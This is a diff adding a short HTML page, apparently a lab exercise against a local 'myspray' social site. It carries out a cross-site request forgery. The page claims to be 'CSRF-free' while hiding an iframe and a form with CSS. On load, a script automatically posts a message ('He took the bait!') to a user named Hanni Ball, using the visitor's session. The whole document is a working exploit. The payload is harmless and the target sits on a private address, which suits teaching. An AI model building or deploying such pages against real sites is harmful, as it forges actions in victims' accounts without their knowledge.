@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>A totally CSRF-free page!</title>
+
+        We don't do CSRF here!</br>
+
+        <!-- Hide the iframe and the form, so the browser does not render anything suspicious. -->
+        <style> iframe {display: none} </style>
+        <style> form {display: none} </style>
+
+        <!-- The iframe's function in this page is avoiding redirection to myspray when the form is submitted. -->
+        <iframe name="my_iframe" width="0" height="0" tabindex="-1" class="hidden"></iframe>
+
+        <!-- Create a form that sends a message to Hanni Ball. -->
+        <form id="my_form" action="http://10.0.23.22/myspray/writemessage92.html" method="post" target="my_iframe">
+            <input name="subject" value="CSRF" type="hidden">
+            <input name="message" value="He took the bait!" type="hidden">
+        </form>
+
+        <!-- Submit the form, sending the message. -->
+	    <script>
+            let form = document.getElementById("my_form");
+		    form.submit();
+	    </script>
+    </head>
+</html>
